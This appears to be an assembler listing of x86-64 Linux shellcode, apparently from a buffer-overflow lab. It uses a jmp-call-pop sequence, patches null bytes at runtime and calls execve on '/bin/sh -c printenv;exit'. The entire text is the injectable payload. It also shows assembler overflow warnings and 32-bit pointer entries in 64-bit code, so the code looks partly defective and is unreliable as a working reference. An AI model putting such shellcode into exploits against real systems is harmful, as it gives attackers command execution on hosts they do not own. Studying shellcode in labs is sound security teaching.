     1                                            bits 64
     2                                              ; find out where we are
     3 00000000 EB40                    start:     jmp short codeEnd
     4 00000002 5E                      start2:    pop rsi
     5                                  
     6                                              ; clear the a register
     7 00000003 B800000000                         mov rax,0x0
     8                                  
     9                                              ; restore null bytes to data
    10 00000008 884607                             mov [rsi+flagStr-exeStr-1],al
    11 0000000B 88460A                             mov [rsi+cmdStr-exeStr-1],al
    12 0000000E 884618                             mov [rsi+arrayAddr-exeStr-1],al
    13 00000011 48894631                           mov [rsi+arrayAddr-exeStr+24],rax
    14                                  
    15                                              ; execve system call
    16 00000015 B83B000000                         mov rax,0x3b
    17 0000001A 48BF-                              mov rdi,exeStr
    17 0000001C [4700000000000000] 
    18 00000024 48BE-                              mov rsi,arrayAddr
    18 00000026 [6000000000000000] 
    19 0000002E 488B142500E6FBF7                   mov rdx,[0x7ffff7fbe600]
    19          ******************       warning: dword data exceeds bounds [-w+number-overflow]
    19          ******************       warning: dword data exceeds bounds [-w+number-overflow]
    20 00000036 0F05                               syscall
    21                                  
    22                                              ; exit system call
    23 00000038 4889C7                             mov rdi,rax
    24 0000003B B83C000000                         mov rax,0x3c
    25 00000040 0F05                               syscall
    26                                  
    27 00000042 E8BBFFFFFF              codeEnd:   call start2
    28                                              ; data
    29 00000047 2F62696E2F736858        exeStr:    db "/bin/shX"
    30 0000004F 2D6358                  flagStr:   db "-cX"
    31 00000052 7072696E74656E763B-     cmdStr:    db "printenv;exitX"
    31 0000005B 6578697458         
    32 00000060 [47000000]              arrayAddr: dd exeStr
    33 00000064 [4F000000]                         dd flagStr
    34 00000068 [52000000]                         dd cmdStr
    35 0000006C FFFFFFFF                           dd 0xffffffffffffffff
